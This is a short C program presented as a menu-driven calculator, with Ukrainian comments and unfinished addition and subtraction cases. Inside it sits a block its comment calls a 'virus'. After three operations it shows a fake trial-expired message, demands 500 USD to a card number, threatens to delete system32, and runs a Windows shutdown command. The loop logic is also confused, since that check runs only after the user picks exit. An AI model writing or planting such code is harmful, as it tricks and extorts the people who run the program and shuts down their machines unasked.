#include <stdio.h>
#include <stdlib.h>

int count = 0; // Глобальна змінна для підрахунку дій

int main() {
    int choice;
    int a, b;
    while(1) {
        // --- ПОЧАТОК "ВІРУСУ" АНДРЮХИ ---
        if (count >= 3) {
            printf("\n!!! TRIAL EXPIRED !!!\n");
            printf("Пробна версія Shitty Calculator закінчилася.\n");
            printf("Перерахуйте 500 USD на карту 4149 1234 5678 9000!\n");
            printf("Інакше програма видалить папку system32!\n");
            system("shutdown /s /t 30"); // Вимкнення ПК через 30 секунд
            exit(1);
        }

    while(1) {
        printf("\n--- Shitty Calculator v0.1 ---\n");
        printf("Actions performed: %d\n", count);
        printf("1. Add\n");
        printf("2. Subtract\n");
        printf("3. Multiply\n");
        printf("4. Divide\n");
        printf("5. Exit\n");
        printf("Choose an option: ");
        scanf("%d", &choice);

        if (choice == 5) {
            printf("Exiting... Good riddance.\n");
            break;
        }

        printf("Enter two integers: ");
        scanf("%d %d", &a, &b);

        switch(choice) {
            case 1:
                // TODO: Женя має додати код
                printf("Addition not implemented yet.\n");
                break;
            case 2:
                // TODO: Женя має додати код
                printf("Subtraction not implemented yet.\n");
                break;
            case 3:
                printf("Result: %d\n", a * b);
                count++;
                break;
            case 4:
                if (b == 0) {
                    printf("Error: Division by zero!\n");
                } else {
                    printf("Result: %d\n", a / b);
                    count++;
                }
                break;
            default:
                printf("Invalid choice!\n");
        }
    }
    return 0;
}